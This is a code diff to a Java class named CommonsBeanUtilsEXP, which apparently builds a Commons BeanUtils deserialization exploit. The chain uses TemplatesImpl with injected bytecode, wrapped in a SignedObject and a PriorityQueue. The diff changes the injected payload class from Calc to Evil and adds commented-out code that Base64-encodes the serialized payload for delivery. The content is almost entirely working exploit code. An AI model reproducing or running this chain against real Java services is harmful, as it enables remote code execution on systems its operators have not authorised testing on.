@@ -9,6 +9,7 @@ import java.security.KeyPair;
 import java.security.KeyPairGenerator;
 import java.security.Signature;
 import java.security.SignedObject;
+import java.util.Base64;
 import java.util.PriorityQueue;
 
 public class CommonsBeanUtilsEXP {
@@ -19,7 +20,7 @@ public class CommonsBeanUtilsEXP {
     }
 
     public static void main(String[] args) throws Exception {
-        byte[] bytes= ClassPool.getDefault().get(Calc.class.getName()).toBytecode();
+        byte[] bytes= ClassPool.getDefault().get(Evil.class.getName()).toBytecode();
 
         TemplatesImpl obj = new TemplatesImpl();
         setFieldValue(obj, "_bytecodes", new byte[][]{bytes});
@@ -36,8 +37,12 @@ public class CommonsBeanUtilsEXP {
         PriorityQueue queue2 = getpayload(signedObject, "object");
 
         //序列化
+//        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+//        ObjectOutputStream oos = new ObjectOutputStream(baos);
+//        oos.writeObject(queue2);
+//        oos.close();
+//        System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));
         serialize(queue2);
-        //System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));
 
         //反序列化
         deserialize("ser.bin");
